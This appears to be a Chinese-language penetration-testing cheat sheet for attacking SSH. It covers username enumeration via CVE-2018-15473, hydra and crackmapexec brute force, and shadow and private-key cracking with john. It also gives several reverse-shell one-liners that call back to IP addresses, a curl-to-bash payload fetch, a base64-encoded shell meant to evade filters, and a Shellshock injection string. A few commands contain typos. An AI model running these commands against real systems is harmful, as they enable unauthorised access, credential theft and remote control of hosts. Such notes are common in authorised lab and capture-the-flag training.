SSH（Secure Shell）是一种用于安全远程访问的网络协议

- **OpenSSH** < 7.7
CVE-2018-15473  , 暴力破解，枚举用户名
```bash
python ssh-username-enum.py <IP> -w <wordlist>
```

**生成 RSA 秘钥对:**
```bash
ssh-keygen -t rsa
```

**常见私钥名称：**
```bash
id_rsa   
id_dsa  
id_ecdsa     
id_ed25519
id_xmss
```

**ssh login**
```bash
ssh [username]@[IP]
ssh -i [id_rsa] [username]@[IP]
```

` -oHostKeyAlgorithms=+ssh-dss `
![](photos/Pasted%20image%2020231211165114.png)

- sign_and_send_pubkey: no mutual signature supported
```
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss 
```

-  获得私钥登录不上去，是不是私钥文件没有权限
```bash
chmod 600 FILE
chmod 400 FILE
```

**crack shadow**
```bash
john [PATH]
```

**enumerate creds**
```bash
hrdra -L [PATH] -P [PATH] [IP] ssh -t 30
```

```bash
crackmapexec ssh [IP] -u [PATH] -p [PATH] [--]
```


**Reverse Shell**

> [Metasploit Framework](../Metasploit%20Framework.md) 

```bash
bash -c "bash -i >& /dec/tcp/[IP]/[PORT] 0&>1"
```

```bash
nc -e /bin/bash [IP] [PORT]
```

```python
export RHOST="192.168.55.3";export RPORT=2233;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.225 3333 >/tmp/f
echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.25 1337' > /tmp/shell.sh ; chmod +x /tmp/shell.sh
echo -e '\nbash -i >& /dev/tcp/10.10.14.11/2233 0>&1' >> xxx
curl http://10.10.14.11/index.html (rev.sh) | bash
```

#### Bypass

- base64
```shell
bash -i >& /dev/tcp/192.168.55.3/2233 0>&1
echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjU1LjMvMjIzMyAwPiYxCg%3d%3d+|+base64+-d+|+bash
#这里要使用CTRL + U编码，不然不知道为什么就是弹不了
```


**SSH Bypass**
![](photos/Pasted%20image%2020240107233934.png)
```
ssh ID@IP 'sh -i'
```

- .bashrc
![](photos/Pasted%20image%2020240107234617.png)
可以删除最后三行然后重新登录就可以拿到交互性 shell


**ShellShock ByPass**
- OpenSSH 5.9p1 Debian
```bash
sudo ssh -i ./noob noob@192.168.55.20 -o PubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss "() { :;}; whoami"
```


**加密私钥解密：**
```
-----BEGIN RSA PRIVATE KEY----- 
Proc-Type: 4,ENCRYPTED 
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
```
可以使用 ssh2john